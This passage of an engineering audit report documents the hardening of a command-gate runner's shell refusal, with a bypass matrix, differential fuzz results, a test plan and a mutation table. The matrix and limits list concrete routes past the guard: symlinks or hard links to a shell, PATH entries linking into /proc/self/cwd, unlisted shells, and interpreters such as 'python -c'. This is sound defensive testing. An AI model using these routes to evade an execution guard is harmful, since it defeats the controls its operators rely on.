r41   empty PATH entry                                               refused   refused   refused     REFUSED  [gate execs 0/0/0]
r42   PATH entry .                                                   refused   refused   refused     REFUSED  [gate execs 0/0/0]
r43   PATH entry /proc/self/cwd                                      refused   refused   refused     REFUSED  [gate execs 0/0/0]
r44   directory link in PATH                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r45   PATH entry that is a link to /proc/self/cwd                    refused   refused   refused     REFUSED  [gate execs 0/0/0]
r46   PATH entry with ..                                             refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r47   first PATH hit is the shell link                               refused   refused   refused     REFUSED  [gate execs 0/0/0]
r48   PATH hit is a link into /proc/self/cwd (relative entry; the ru MARK      refused   MARK        BYPASS  [gate execs 1/0/1]
r49   PATH hit is a link into /proc/self/cwd (absolute entry)        MARK      refused   MARK        BYPASS  [gate execs 1/0/1]
r50   .//mysh and ./././mysh                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r51   trailing slash                                                 refused   refused   refused     REFUSED  [gate execs 0/0/0]
r52   case: MYSH                                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r53   symlinked gate cwd                                             refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r54   symlinked --root                                               refused   refused   refused     REFUSED  [gate execs 0/0/0]
r55   link in a subfolder of the gate cwd                            refused   refused   refused     REFUSED  [gate execs 0/0/0]
r58   //dev/null (QA Q26: the double-slash form)                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r59   //proc/1/cwd/x (another pid, double slash)                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r57   links first, middle and last in one word (a1/a2/mysh)          refused   refused   refused     REFUSED  [gate execs 0/0/0]
r56   LIMIT: env handed a link to a shell                            MARK      MARK      MARK        LIMIT: the wrapper rule compares argument names, not what a link points at: not detected  [gate execs 14/14/14]
l01   LIMIT: a copy of a shell                                       MARK      MARK      MARK        LIMIT: a copy has its own name and content: not detected  [gate execs 1/1/1]
l02   LIMIT: a hard link of a shell                                  MARK      MARK      MARK        LIMIT: a hard link is a second name for the same inode: not detected  [gate execs 1/1/1]
l03   LIMIT: a symlink to a wrapper                                  MARK      MARK      MARK        LIMIT: a link to a wrapper is not a wrapper name: not detected  [gate execs 2/2/2]
l04   LIMIT: earlier PATH file exec skips (no shebang)               MARK      MARK      MARK        LIMIT: exec skips d1/mysh (ENOEXEC) and runs d2/mysh; the plan stops at d1  [gate execs 2/2/2]
l05   LIMIT: a shell not in the 14 names                             MARK      MARK      MARK        LIMIT: the list has 14 names; ksh93 is not one  [gate execs 1/1/1]
SUMMARY {'REFUSED': 49, 'LIMIT': 6, 'BYPASS': 9, 'ANOMALY': 0} rows 64
```

The rev-3c test files run against the rev-3b source: `33 failed, 644 passed in 26.60s (rev-3b source, rev-3c tests: the D1 repro, the PATH-hit and link-target rows, the fuzz and the matrix fail)`. Against the first rev-3c draft (before D1b and D1c were fixed): `14 failed, 663 passed in 25.50s (first rev-3c draft source, rev-3c tests: rows r36, r37, r48, r49, the link-target and PATH-hit tests and the fuzz fail)`.

**15. The differential fuzz (D1b and D1c were first seen here).** `02_strategy-architect_C9_fuzz.py` (the suite carries a 450-layout seeded version): per layout a fresh folder with `bin/bash` (the test-made shell) and up to 10 links, ingredients that include `/proc/self/cwd`, `/proc/thread-self/cwd`, `/proc/self/root<B>/sub`, `..` chains, absolute and relative targets and `lnk/../mysh`; 40 words per layout (random prefixes `//`, `./`, `/proc/self/cwd/`, `../`, random parts, bare names with random PATH values). Truth is the kernel's: this process with its cwd set to the gate's folder stats the word; the plan is `_shell_refusal` with the process cwd elsewhere. Violation = the kernel reaches the shell and the plan accepts. The script also spawns the same word with `Popen(cwd=gate cwd)` for every route to the shell and a sample of the rest and compares with the model (line `model-vs-real-exec`: it agreed in every checked case).

```
== rev 3b tree (800 layouts, seed 1)
VIOLATION '/tmp/fz_q8ahcbb9/sub/mysh2' PATH= None [('sub/lnk', '/proc/self/cwd/.'), ('sub/up', '../x/..'), ('mysh', '/tmp/fz_q8ahcbb9/bin/bash'), ('sub/mysh2', 'lnk/../mysh'), ('x/q', 'y/z/bash'), ('bin/l2', '../../../../../../../../mysh/q/x')]
model-vs-real-exec {(True, True): 821, (False, False): 306}
seed 1 layouts 800 words 32000 truth-reaches-bash 821 VIOLATIONS 57 non-shell refusals (cost) 4094
== first rev-3c draft (800 layouts, seed 1)
VIOLATION 'mysh2' PATH= sub:bin:. [('sub/lnk', '../../../../../../../../../../../../proc/self/cwd'), ('sub/d', '../bin'), ('mysh', '/tmp/fz_pj9g_b4y/bin/bash'), ('sub/mysh2', 'lnk/../mysh'), ('x/y/z', '../../sub/up'), ('bin/m3', '../mysh'), ('x/q', 'y/z'), ('s
model-vs-real-exec {(True, True): 821, (False, False): 306}
seed 1 layouts 800 words 32000 truth-reaches-bash 821 VIOLATIONS 45 non-shell refusals (cost) 8934
== shipped rev-3c tree: 8 seeds x 1500 layouts x 40 words
model-vs-real-exec {(True, True): 1495, (False, False): 574}
seed 11 layouts 1500 words 60000 truth-reaches-bash 1495 VIOLATIONS 0 non-shell refusals (cost) 16910
model-vs-real-exec {(True, True): 1523, (False, False): 581}
seed 12 layouts 1500 words 60000 truth-reaches-bash 1523 VIOLATIONS 0 non-shell refusals (cost) 16913
model-vs-real-exec {(False, False): 578, (True, True): 1600}
seed 13 layouts 1500 words 60000 truth-reaches-bash 1600 VIOLATIONS 0 non-shell refusals (cost) 16984
model-vs-real-exec {(True, True): 1522, (False, False): 557}
seed 14 layouts 1500 words 60000 truth-reaches-bash 1522 VIOLATIONS 0 non-shell refusals (cost) 16824
model-vs-real-exec {(True, True): 1539, (False, False): 564}
seed 15 layouts 1500 words 60000 truth-reaches-bash 1539 VIOLATIONS 0 non-shell refusals (cost) 16851
model-vs-real-exec {(True, True): 1552, (False, False): 582}
seed 16 layouts 1500 words 60000 truth-reaches-bash 1552 VIOLATIONS 0 non-shell refusals (cost) 17077
model-vs-real-exec {(True, True): 1567, (False, False): 589}
seed 17 layouts 1500 words 60000 truth-reaches-bash 1567 VIOLATIONS 0 non-shell refusals (cost) 16710
model-vs-real-exec {(True, True): 1520, (False, False): 549}
seed 18 layouts 1500 words 60000 truth-reaches-bash 1520 VIOLATIONS 0 non-shell refusals (cost) 17053
```


## Test plan

**Must still pass (unchanged):** every existing test, in particular `tests/test_evals_baseline.py` (the C4 exit-code contract 0/1/2/3 and `--baseline`), `tests/test_evals.py`, `tests/test_stream.py`, `tests/test_workspace.py`, `tests/test_safety.py`, `tests/test_sensitive_paths.py`, `tests/test_secret_scan.py`. No existing test file is edited.

**What each rule is proven by** (rule -> tests; the mutation table names the mutant that dies for each):

| rule | tests |
|---|---|
| the four backlog proof lines | `test_proof_plain_string_runs_as_argv`, `test_proof_metachar_is_a_policy_error_and_nothing_spawns`, `test_proof_shell_true_only_when_declared_and_allowed`, `test_proof_timeout_is_timeout_never_pass` |
| strict file schema (63 bad documents, 15 bad raw files, boundaries) | `test_good_file_loads_exactly`, `test_bad_file_is_refused_and_exit_2`, `test_bad_raw_file_is_refused`, `test_gate_count_boundary`, `test_file_size_boundary`, `test_file_size_cap_applies_before_parsing`, `test_the_file_read_is_bounded`, `test_timeout_bounds`, `test_timeout_values_that_are_not_finite_positive_numbers`, `test_id_boundaries`, `test_bad_gate_is_numbered_from_one` |
| empty list, unusable file, FIFO, symlink, unreadable | `test_empty_gate_list_exit_2_nothing_runs`, `test_run_gates_refuses_an_empty_list`, `test_missing_or_directory_gate_file_exit_2`, `test_fifo_gate_file_is_refused_without_blocking`, `test_unreadable_gate_file_exit_2`, `test_symlink_to_a_regular_gate_file_is_accepted` |
| metacharacter set and false positives | `test_every_metacharacter_is_refused` (9), `test_metacharacters_refused_even_inside_quotes` (16), `test_shell_false_with_metacharacters_is_still_refused`, `test_plain_strings_become_argv` (16) |
| shlex edges, empty, NUL, surrogate, dash, `=`, sizes | `test_plain_strings_refused` (15), `test_command_length_boundary`, `test_argv_item_count_accepted`, `test_argv_item_count_limit`, `test_argv_item_length_boundary`, `test_huge_argv_is_refused_by_the_guard_cap`, `test_argv_form_is_verbatim`, `test_argv_form_refused` (8), `test_later_argument_may_start_with_dash_and_contain_equals` |
| shell: true | `test_shell_gate_plan_is_sh_dash_c`, `test_shell_gate_needs_the_caller_flag`, `test_shell_gate_is_refused_without_posix`, `test_shell_gate_empty_command`, `test_shell_gate_length_boundary`, `test_shell_gate_nul_is_refused`, `test_shell_gate_keeps_metacharacters_and_newlines`, `test_cli_allow_shell_flag` |
| guard and sensitive paths | `test_guard_denial_is_a_policy_error` (12), `test_guard_allows_ordinary_gates`, `test_guard_runs_on_the_joined_argv_and_is_called_once`, `test_a_guard_crash_is_a_refusal_not_a_spawn`, `test_a_credential_folder_is_refused_as_cwd_even_inside_the_root` (5) |
| refusal text hygiene | `test_a_refusal_never_echoes_the_command_or_cwd` (11), `test_the_report_never_contains_the_command_or_the_env`, `test_unexpected_error_is_exit_2_and_never_echoes_the_text` |
| cwd fence | `test_cwd_default_is_the_root_and_child_runs_there`, `test_cwd_subfolder_is_honoured_by_the_child`, `test_cwd_dot_dot_inside_the_root_is_fine`, `test_cwd_outside_the_root_is_refused`, `test_cwd_lexical_refusals` (7), `test_cwd_must_be_an_existing_folder`, `test_shell_gates_are_fenced_too`, `test_cli_root_flag_fences_the_gates`, `test_cli_root_flag_sets_the_default_cwd`, `test_cli_bad_root_exit_2` |
| spawn: spy on `Popen`, argv list, no shell, env, stdin, session | `test_spawn_arguments`, `test_one_spawn_per_gate_in_declared_order`, `test_stdin_is_closed_not_inherited` (real process, stdin pipe left open), `test_env_is_scrubbed` (real child lists its env), `test_stream_process_cwd_defaults_to_the_current_folder_and_can_be_set` |
| status mapping | `test_exit_code_mapping` (8 real children: 0, 1, 3, 255, SIGKILL, SIGTERM, bare `SystemExit`, uncaught exception), `test_signal_death_message_and_exit_1`, `test_a_silent_gate_with_exit_0_passes_and_a_noisy_failure_fails`, `test_missing_executable_is_an_error_not_a_pass`, `test_not_executable_is_an_error`, `test_other_spawn_failures_are_errors_without_the_exception_text`, `test_unexpected_exception_while_collecting_is_an_error`, `test_keyboard_interrupt_is_not_swallowed`, `test_missing_exit_status_is_an_error`, `test_timeout_outranks_an_exit_code_of_zero`, `test_timeout_keeps_the_output_so_far`, `test_status_to_exit_code` (12) |
| timeouts, group kill, bounds | `test_timeout_kills_the_whole_process_group` (a grandchild that would write a file after 2 s is gone), `test_a_daemonised_grandchild_holding_the_pipe_is_a_timeout_not_a_pass`, `test_total_budget_spent_means_not_run_never_pass`, `test_total_budget_caps_the_running_gate_and_skips_the_rest`, `test_total_budget_boundary_with_a_frozen_clock`, `test_a_generous_budget_changes_nothing`, `test_per_gate_timeout_is_the_smaller_of_gate_and_remaining`, `test_durations_are_small_non_negative_numbers`, `test_the_documented_bounds` |
| no gate skipped, order, duplicates | `test_every_gate_runs_after_a_failure`, `test_all_pass_is_ok_and_exit_0`, `test_a_single_failure_among_many_passes_is_not_ok`, `test_duplicate_ids_never_swallow_a_gate`, `test_declared_order_is_kept_not_sorted`, `test_report_counts_only_passes`, `test_same_file_same_report_apart_from_durations` |
| policy error spawns nothing (spy raises on any `Popen`) | `test_a_refused_gate_spawns_nothing_and_skips_every_gate` (10 refusals x first/middle/last), `test_two_refused_gates_are_both_reported`, `test_refused_gates_never_run_even_if_the_flag_is_on`, `test_policy_error_report_exit_2` |
| output: redaction before the cut, caps, bytes | `test_tails_are_redacted`, `test_redaction_happens_before_the_tail_is_cut`, `test_tail_boundary`, `test_stderr_tail_is_cut_too`, `test_the_tail_is_the_end_of_the_output`, `test_huge_output_is_bounded` (4 MB), `test_capture_truncation_counts_even_when_redaction_shrinks_the_text`, `test_the_capture_window_is_exactly_64000_bytes`, `test_short_output_is_kept_whole_and_not_truncated`, `test_invalid_utf8_output_does_not_crash`, `test_non_ascii_output_survives_an_ascii_stdout` |
| report, CLI, exit codes, lost report | `test_report_schema_and_key_order`, `test_a_gate_file_is_not_a_c4_baseline`, `test_cli_exit_codes_with_real_processes`, `test_cli_default_root_is_the_current_folder` (PYTHONUNBUFFERED unset and set), `test_cli_bad_arguments_exit_2`, `test_a_lost_report_is_exit_2` (8), `test_closed_stdout_is_exit_2`, `test_keyboard_interrupt_while_writing_the_report_propagates`, `test_full_disk_buffered_stdout_is_exit_2` (real `/dev/full`) |
| signals sent to the runner | `test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass` (real process via the `BOOT` line, SIGINT, SIGTERM and SIGHUP: the gate child is gone, no report, exit not in 0/1/2, 143 / 129 / -2 or 130), `test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored` (2), `test_the_handlers_are_left_alone_off_the_main_thread`, `test_a_handler_installed_from_c_is_restored_to_the_default` |
| a shell is not a non-shell gate (ATK1) | `test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate` (41 list and string forms), `test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper` (14 names x 3 forms), `test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise` (29), `test_programs_that_run_a_shell_by_design_are_refused_outright` (2), `test_ordinary_programs_are_not_mistaken_for_shells` (14), `test_a_symlink_that_points_at_a_shell_is_refused_whatever_it_is_called` (2), `test_a_file_named_sh_is_refused_by_name_even_when_it_is_not_a_shell`, `test_a_declared_shell_gate_still_runs_through_sh_when_allowed`, `test_the_shell_check_never_runs_on_a_declared_shell_gate_argv`, `test_the_shell_check_covers_the_list_form_and_the_string_form_the_same_way`, `test_a_shell_gate_in_a_file_spawns_nothing_and_exits_2` (real CLI, `out.txt` must not exist), `test_shell_names_and_wrappers_are_the_documented_lists`, and 3 refused shell gates in `REFUSED` x first/middle/last |
| the shell check resolves from the gate's cwd (ATK4) | `test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd`, `test_a_relative_symlink_is_refused_when_the_runner_is_in_another_folder`, `test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing` (2), `test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd` (5), `test_the_relative_path_entry_is_not_taken_from_the_runner_cwd`, `test_a_non_executable_file_on_path_is_skipped_like_the_child_does`, `test_the_stated_residual_limits_of_the_shell_refusal_are_pinned`, `test_the_documented_wrapper_false_positives_are_refused` (3) |
| `/proc` and `/dev` refused (ATK5) | `test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder` (17), `test_the_real_cli_refuses_the_proc_cwd_bypass_and_creates_nothing` (3), `test_a_path_entry_under_proc_or_dev_refuses_a_bare_name` (4), `test_a_relative_path_entry_that_is_a_link_into_proc_refuses_a_bare_name`, `test_a_symlink_in_the_gate_folder_that_leads_into_proc_or_dev_is_refused` (6), `test_a_path_hit_that_is_a_link_into_proc_is_refused`, `test_the_proc_refusal_never_echoes_the_word`, `test_a_link_loop_is_refused_not_followed_forever`, `test_only_the_executable_word_is_looked_at_for_proc_and_dev` |
| the resolution-mismatch matrix and D1 (rev 3c) | `test_matrix_every_row_is_refused_with_the_runner_in_another_folder` (49, real CLI), `test_matrix_core_rows_are_refused_in_every_runner_placement` (15 rows x M2 and M3), `test_matrix_documented_limits_really_run_the_marker` (6), `test_the_d1_repro_exactly_as_qa_reported_it`, `test_any_dotdot_component_in_the_executable_is_refused_before_any_normalisation` (7), `test_dotdot_is_refused_in_a_path_entry_that_the_search_reaches_not_in_one_after_the_hit`, `test_arguments_and_python_bodies_and_declared_shell_gates_keep_their_dotdot`, `test_an_unreadable_link_or_any_os_error_while_resolving_is_a_refusal_not_a_pass`, `test_the_root_names_are_matched_whole_so_a_sibling_folder_is_not_inside_them`, `test_a_metacharacter_as_the_first_character_is_refused_too` (7), `test_a_relative_link_target_is_resolved_from_the_links_own_folder` |
| first PATH hit (ATK6) and the stated shebang limit | `test_the_first_path_hit_wins_not_the_last`, `test_the_stated_limit_an_earlier_path_file_that_exec_skips_is_accepted` (2) |
| the test environment (ATK2, ATK3) | `test_missing_executable_is_an_error_not_a_pass` pins PATH; the runner child is started through `BOOT`; all 677 cases pass under `trap '' INT`, `trap '' INT HUP`, `setsid nohup`, closed stdin, as `nobody`, as root, under `env -i` (Proof 10) |
| bounds and speed | `test_pathological_commands_are_fast` (11 shapes), `test_oversized_commands_are_refused_without_parsing` (200,000 and 1,000,000), `test_the_module_has_no_regex`, `test_runner_contract_is_untouched` |

**Mutation plan and result.** The runner `_workspace/02_strategy-architect_C9_mutate.py` (usage in its docstring) builds, for each mutant, a FRESH tar copy of the whole audited tree (`src/`, `tests/`, `skills/`, `.claude/`, `scripts/`, `pyproject.toml`, `.gitignore`; never `.git`, `references/` or `__pycache__`; the copy is listed and the three required entries are asserted), applies the exact-string edits (each `old` text must occur exactly the stated number of times, the file must change, a no-op mutation is an error), checks that `master_finhub.evals.gates` is imported FROM THE COPY, then starts a fresh `python -B -m pytest -x -q tests/test_gates.py` with `PYTHONUNBUFFERED` unset. Ordering mutants (F22 builds the report from a set) run under `PYTHONHASHSEED` 0..39 and must be killed under every seed. A mutant killed only by a timing-sensitive test is re-run alone and counts only if it dies again (14 did, all died again). A mutated run that times out counts as killed and is flagged (none did). The control (unmutated copy) runs first and must pass: `CONTROL (unmutated copy, serial): rc=0 677 passed in 25.72s`.

Result on the audited tree: `TOTAL 427: killed 419, survived-equivalent 8, unexpected survivors/partial 0`.

| group | what it covers | mutants | killed | equivalent |
|---|---|---|---|---|
| K | constants and bounds, every boundary +-1 | 16 | 16 | 0 |
| X | metacharacter set: each member dropped, 12 false-positive characters added, root/gate key sets | 24 | 24 | 0 |
| L | file loader: isfile, read bound, size cap, decoding, duplicates, recursion, root, version, list, count, duplicates, dropped gates | 28 | 27 | 1 |
| P | gate schema: every field, id grammar, exclusivity, shell type, timeout bounds, cwd | 36 | 36 | 0 |
| A | string -> argv: strip, length, scan, shlex mode and errors | 10 | 10 | 0 |
| R | argv rules: empty, size, NUL, encoding, executable shape | 14 | 14 | 0 |
| Q | plan: shell preconditions, guard call and its arguments, cwd fence, refusal text, fail-closed catch | 40 | 40 | 0 |
| E | spawn arguments and status mapping, tails, redaction, durations | 40 | 40 | 0 |
| F | run_gates, budget, order, exit-code mapping, report counts | 34 | 34 | 0 |
| M | CLI: flags, root, error handling, report write, lost report, kind/schema | 23 | 22 | 1 |
| G | signals sent to the runner: SIGTERM and SIGHUP handlers installed, exit code, scope, restore (incl. the C-installed None), other thread | 16 | 16 | 0 |
| H | shell refusal (rev 2): where it is applied, names, case, .exe, directory, realpath, PATH lookup, runners, wrappers, per-name and per-wrapper drops, echo, false positives | 82 | 82 | 0 |
| T | round 3 (ATK4): resolution from the gate's cwd, path form, PATH search, relative and empty entries, executable and regular-file tests, symlink resolution | 15 | 15 | 0 |
| V | rounds 3b and 3c: opaque roots and the exact-root and sibling rules, link limit, refusal catch and echo | 7 | 7 | 0 |
| W | round 3c (D1): the `..` rule on the raw word and PATH entry, no normalisation, the physical walk (links examined, targets pushed, order, absolute and relative targets, no advance), fail-closed OSError | 22 | 21 | 1 |
| S | stream.py: cwd, stdin, session, group kill, shell, env scrub | 15 | 15 | 0 |
| Z | declared equivalents | 5 | 0 | 5 |

8 survivors are declared equivalent with their reason in the table (L24, M22, W20, Z01, Z02, Z03, Z04, Z05). Independent of the table, 12 mutants were re-run against ONLY the one test that should kill them (S02, S07, S03, S13, E01, E06, S01 are killed by real child processes, no spawn spy involved): L04, Q05, Q23, E01, E06, E14, F05, S01, S02, S03, S07, S13; 12 of 12 died, each `1 failed, N deselected` (`indep.py` in the scratchpad, output saved as `02_strategy-architect_C9_indep.out`).

**What the shell-refusal mutants (H) prove and what they cannot (QA bar row (a), "runs a shell when it was not declared").** They prove that each rule of Design 4b is pinned: where it is applied (H01-H03), the name normalisation (H04-H06, H17), the path and PATH resolution (H07-H10), the runners (H11, H5-*), the wrapper rule and its argument scan (H12-H16, H6-*), each of the 14 shell names both as executable and behind a wrapper (H3-*, H4-*), each of the 29 wrappers (H6-*), the message hygiene (H18, H19, H23) and the false-positive guards (H20-H22). In the rev-1 tree none of this was visible: removing the refusal changed no test, which is how ATK1 got through. They cannot prove that no shell can be started: wrappers not on the list, wrapper chains, interpreters (`python -c`, `perl -e`, `awk system()`, `node -e`), `make`, scripts and any program that starts a shell are not detected and no mutant says they are. The row is therefore met for the string form and the list form with a shell or a listed wrapper as the executable, and not met, by design, for the rest (Decision 3c, Does not cover).

History, for the judge: a first 260-mutant batch on an earlier revision found (1) a real gap, the id grammar's `/` was untested because the leading-`.` rule refused my only slash case first (P10; fixed with `id-inner-slash`, `id-backslash`, `id-colon`, `id-semicolon`, `id-inner-newline`), (2) L24 is equivalent (`!=` and `<` are the same test on a set and its list), and (3) a control failure caused by my OWN runner variable `C9_ONLY` matching a test's `C9_` env-name prefix (the tests now use the prefix `GATETEST_`, a name no runner uses). The same batch exposed that the guard call took only the command, which led to Design 6's `cwd` key (Q24, Q24b-d). A later probe of the CLI (a SIGTERM sent to the runner left a running 60 s gate alive, the real-process demo in Proof 8) produced `_sigterm_raises`, three tests and mutants G01-G12. Every later round re-ran all mutants from scratch. Round 2 (this revision) added H01-H6-* and changed G01-G14, and also re-ran the judge's 50 mutants I01-I50 (Proof 11).

### The mutation table (every mutant, audited tree)

| id | mutation | result | killed by (first failing test, `-x`) |
|---|---|---|---|
| K01 | MAX_GATES 51 | KILLED | test_bad_file_is_refused_and_exit_2 |
| K02 | MAX_GATES 49 | KILLED | test_gate_count_boundary |
| K03 | MAX_FILE_BYTES -1 | KILLED | test_the_documented_bounds |
| K04 | MAX_FILE_BYTES +1 | KILLED | test_the_documented_bounds |
| K05 | MAX_TEXT_CHARS 4095 | KILLED | test_plain_strings_become_argv |
| K06 | MAX_TEXT_CHARS 4097 | KILLED | test_plain_strings_refused |
| K07 | MAX_ARGV_ITEMS 255 | KILLED | test_argv_item_count_accepted |
| K08 | MAX_ARGV_ITEMS 257 | KILLED | test_argv_item_count_limit |
| K09 | DEFAULT_TIMEOUT_S 299 | KILLED | test_good_file_loads_exactly |
| K10 | MAX_TIMEOUT_S 1799 | KILLED | test_good_file_loads_exactly |
| K11 | MAX_TIMEOUT_S 1801 | KILLED | test_bad_file_is_refused_and_exit_2 |
| K12 | MAX_TOTAL_S 3601 | KILLED | test_the_documented_bounds |
| K13 | TAIL_CHARS 3999 | KILLED | test_redaction_happens_before_the_tail_is_cut |
| K14 | TAIL_CHARS 4001 | KILLED | test_redaction_happens_before_the_tail_is_cut |
| K15 | SHELL_PATH bash | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| K16 | SCHEMA_VERSION 2 | KILLED | test_good_file_loads_exactly |
| X01 | metacharacter ';' dropped from the set | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| X02 | metacharacter '&' dropped from the set | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| X03 | metacharacter '/' dropped from the set | KILLED | test_every_metacharacter_is_refused |
| X04 | metacharacter '`' dropped from the set | KILLED | test_every_metacharacter_is_refused |
| X05 | metacharacter '$' dropped from the set | KILLED | test_every_metacharacter_is_refused |
| X06 | metacharacter '<' dropped from the set | KILLED | test_every_metacharacter_is_refused |
| X07 | metacharacter '>' dropped from the set | KILLED | test_every_metacharacter_is_refused |
| X08 | metacharacter '\\n' dropped from the set | KILLED | test_every_metacharacter_is_refused |
| X09 | metacharacter '\\r' dropped from the set | KILLED | test_every_metacharacter_is_refused |
| X10 | false positive: '(' added to the metacharacter set | KILLED | test_proof_plain_string_runs_as_argv |
| X11 | false positive: ')' added to the metacharacter set | KILLED | test_proof_plain_string_runs_as_argv |
| X12 | false positive: '{' added to the metacharacter set | KILLED | test_plain_strings_become_argv |
| X13 | false positive: '*' added to the metacharacter set | KILLED | test_plain_strings_become_argv |
| X14 | false positive: '~' added to the metacharacter set | KILLED | test_plain_strings_become_argv |
| X15 | false positive: '#' added to the metacharacter set | KILLED | test_plain_strings_become_argv |
| X16 | false positive: '!' added to the metacharacter set | KILLED | test_the_documented_bounds |
| X17 | false positive: '\\t' added to the metacharacter set | KILLED | test_plain_strings_become_argv |
| X18 | false positive: "'" added to the metacharacter set | KILLED | test_proof_plain_string_runs_as_argv |
| X19 | false positive: '?' added to the metacharacter set | KILLED | test_the_documented_bounds |
| X20 | false positive: '[' added to the metacharacter set | KILLED | test_the_documented_bounds |
| X21 | false positive: '=' added to the metacharacter set | KILLED | test_plain_strings_become_argv |
| X30 | root keys: extra accepted | KILLED | test_bad_file_is_refused_and_exit_2 |
| X31 | gate keys: env accepted | KILLED | test_bad_file_is_refused_and_exit_2 |
| X32 | gate keys: cwd dropped | KILLED | test_good_file_loads_exactly |
| L01 | isfile check removed | KILLED | test_missing_or_directory_gate_file_exit_2 |
| L02 | unbounded read | KILLED | test_the_file_read_is_bounded |
| L03 | read one byte short (size cap never trips) | KILLED | test_file_size_boundary |
| L04 | size cap: > becomes >= | KILLED | test_file_size_boundary |
| L05 | size cap removed | KILLED | test_file_size_boundary |
| L06 | decode errors replaced | KILLED | test_bad_raw_file_is_refused |
| L07 | BOM tolerated | KILLED | test_bad_raw_file_is_refused |
| L08 | latin-1 decode | KILLED | test_bad_raw_file_is_refused |
| L09 | duplicate keys allowed | KILLED | test_bad_raw_file_is_refused |
| L10 | RecursionError not caught | KILLED | test_bad_raw_file_is_refused |
| L11 | ValueError not caught | KILLED | test_bad_raw_file_is_refused |
| L12 | unknown root keys allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| L13 | root type check removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| L14 | version: bool and 1.0 pass | KILLED | test_bad_file_is_refused_and_exit_2 |
| L15 | version: any int passes | KILLED | test_bad_file_is_refused_and_exit_2 |
| L16 | version: 1.0 passes | KILLED | test_bad_file_is_refused_and_exit_2 |
| L17 | version check removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| L18 | empty gate list allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| L19 | gates list type not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| L20 | gate count: > becomes >= | KILLED | test_gate_count_boundary |
| L21 | gate count cap removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| L22 | duplicate ids: != becomes > | KILLED | test_bad_file_is_refused_and_exit_2 |
| L23 | duplicate id check removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| L24 | duplicate ids: != becomes < | SURVIVED | EQUIVALENT: a set is never larger than its list, so `!=` and `<` are the same test |
| L25 | gate numbering starts at 0 | KILLED | test_bad_gate_is_numbered_from_one |
| L26 | last gate dropped at load | KILLED | test_good_file_loads_exactly |
| L27 | first gate dropped at load | KILLED | test_good_file_loads_exactly |
| L28 | gates beyond the cap truncated, not refused | KILLED | test_bad_file_is_refused_and_exit_2 |
| P01 | gate object check removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P02 | unknown gate keys allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P03 | id check removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P04 | empty id allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P05 | id length 65 allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P06 | id length 64 refused | KILLED | test_id_boundaries |
| P07 | non-ASCII ids allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P08 | leading punctuation in ids allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P09 | space allowed in ids | KILLED | test_bad_file_is_refused_and_exit_2 |
| P10 | slash allowed in ids | KILLED | test_bad_file_is_refused_and_exit_2 |
| P11 | dot not allowed in ids | KILLED | test_good_file_loads_exactly |
| P12 | dash not allowed in ids | KILLED | test_good_file_loads_exactly |
| P13 | underscore not allowed in ids | KILLED | test_good_file_loads_exactly |
| P14 | id type not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| P15 | command and argv together allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P16 | command or argv alone refused | KILLED | test_good_file_loads_exactly |
| P17 | command type not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| P18 | argv type not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| P19 | argv list type not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| P20 | argv item types not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| P21 | shell flag type not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| P22 | shell flag coerced with bool() (the reference's bug) | KILLED | test_bad_file_is_refused_and_exit_2 |
| P23 | shell with argv allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P24 | timeout default None | KILLED | test_good_file_loads_exactly |
| P25 | bool timeout allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P26 | string timeout allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P27 | OverflowError not caught | KILLED | test_bad_file_is_refused_and_exit_2 |
| P28 | timeout 0 allowed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P29 | timeout upper bound exclusive | KILLED | test_good_file_loads_exactly |
| P30 | timeout upper bound removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P31 | timeout lower bound removed | KILLED | test_bad_file_is_refused_and_exit_2 |
| P32 | default cwd empty | KILLED | test_good_file_loads_exactly |
| P33 | cwd type not checked | KILLED | test_bad_file_is_refused_and_exit_2 |
| P34 | argv kept as a list | KILLED | test_good_file_loads_exactly |
| P35 | timeout default is the max | KILLED | test_good_file_loads_exactly |
| P36 | NaN timeout accepted (negated comparison) | KILLED | test_bad_raw_file_is_refused |
| A01 | command string not stripped | KILLED | test_plain_strings_become_argv |
| A02 | command length: > becomes >= | KILLED | test_plain_strings_become_argv |
| A03 | command length cap removed | KILLED | test_plain_strings_refused |
